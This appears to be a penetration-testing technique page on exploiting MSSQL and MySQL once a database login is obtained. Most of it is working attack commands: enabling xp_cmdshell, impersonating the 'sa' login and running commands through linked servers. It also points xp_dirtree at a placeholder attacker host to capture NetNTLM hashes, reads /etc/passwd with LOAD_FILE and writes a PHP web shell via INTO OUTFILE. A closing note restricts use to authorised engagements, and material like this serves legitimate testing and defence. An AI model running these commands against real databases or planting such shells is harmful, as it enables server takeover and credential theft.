---
tool: Database attacks
slug: database-attacks
kind: technique
stages: [exploitation]
category: MSSQL and MySQL from a login
platforms: [linux, network]
services: [mssql, mysql]
ports: [1433, 3306]
tags: [mssql, mysql, xp_cmdshell, linked-servers, command-execution]
attack: [T1190, T1059, T1078]
summary: Once you have a database login, turn it into command execution and credentials. On MSSQL that means xp_cmdshell, impersonation and linked servers; on MySQL, reading files and writing a web shell. The database is often the shortest path from a weak credential to a shell.
references:
  - The Hacker Recipes: MSSQL | https://www.thehacker.recipes/systems-and-services/initial-access/mssql
  - HackTricks pentesting MSSQL | https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html
---

## When to reach for it

You have a database credential from a config file, a spray or SQL injection, and want more than data. MSSQL runs as a service account (often with `SeImpersonatePrivilege`), so command execution there is a strong foothold. MySQL rarely runs code directly but can read local files and, with `FILE` privilege and a writable web root, drop a shell.

## MSSQL

Connect with impacket (Windows auth adds `-windows-auth`):

```bash
mssqlclient.py DOMAIN/user:pass@TARGET -windows-auth
```

In the SQL shell, enable and use command execution:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

Impersonate a more privileged login, and hop to a linked server that may run as sysadmin:

```sql
EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;
EXEC ('EXEC xp_cmdshell ''whoami'';') AT [LINKED\SERVER];
```

Capture the service account's NetNTLM hash by pointing it at your Responder with `xp_dirtree`:

```sql
EXEC xp_dirtree '\\YOUR_IP\share', 1, 1;
```

## MySQL

Read a local file and write a web shell into the document root (needs `FILE` and `secure_file_priv` unset):

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/s.php';
```

## Workflow

1. Confirm the service and privileges: `mssqlclient.py` then `SELECT IS_SRVROLEMEMBER('sysadmin');`, or enumerate impersonatable logins.
2. On MSSQL, enable `xp_cmdshell` (sysadmin) or impersonate / linked-server your way to it; catch the NetNTLM with `xp_dirtree` if direct exec is blocked.
3. On MySQL, read secrets with `LOAD_FILE` and drop a shell with `INTO OUTFILE` where the web root is writable.
4. Use the foothold or hash to escalate or move on.

## Notes

Enabling `xp_cmdshell`, impersonating logins and writing files all change server state and are logged, so confirm database abuse is in scope, prefer read-only checks first, and record what you enabled or wrote so it can be reverted. In-scope and authorised use only; credentials, hashes and files recovered here are sensitive loot to handle with the rest of the engagement data.
